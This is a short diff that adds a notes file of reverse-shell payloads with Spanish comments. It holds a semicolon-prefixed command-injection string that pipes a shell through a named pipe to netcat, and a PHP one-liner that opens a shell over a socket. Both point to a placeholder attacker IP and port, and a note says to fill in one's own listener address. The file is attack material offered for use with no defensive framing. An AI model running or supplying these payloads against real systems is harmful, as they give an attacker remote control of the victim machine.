@@ -1,0 +1,6 @@
+; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "tu ip" "port" >/tmp/f
+
+
+<ip> = tu ip y los puertos que usaste como escucha 
+
+php -r '$sock=fsockopen("tu ip","port");exec("/bin/sh -i <&3 >&3 2>&3");'
